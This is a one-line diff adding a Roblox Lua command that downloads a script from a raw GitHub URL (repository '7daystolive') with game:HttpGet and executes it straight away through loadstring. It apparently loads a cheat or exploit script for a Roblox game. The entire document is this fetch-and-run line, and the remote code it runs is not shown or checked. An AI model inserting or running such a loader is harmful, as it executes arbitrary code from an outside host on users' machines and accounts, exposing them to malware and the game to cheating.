@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/decryp1/7daystolive/refs/heads/main/script'))()
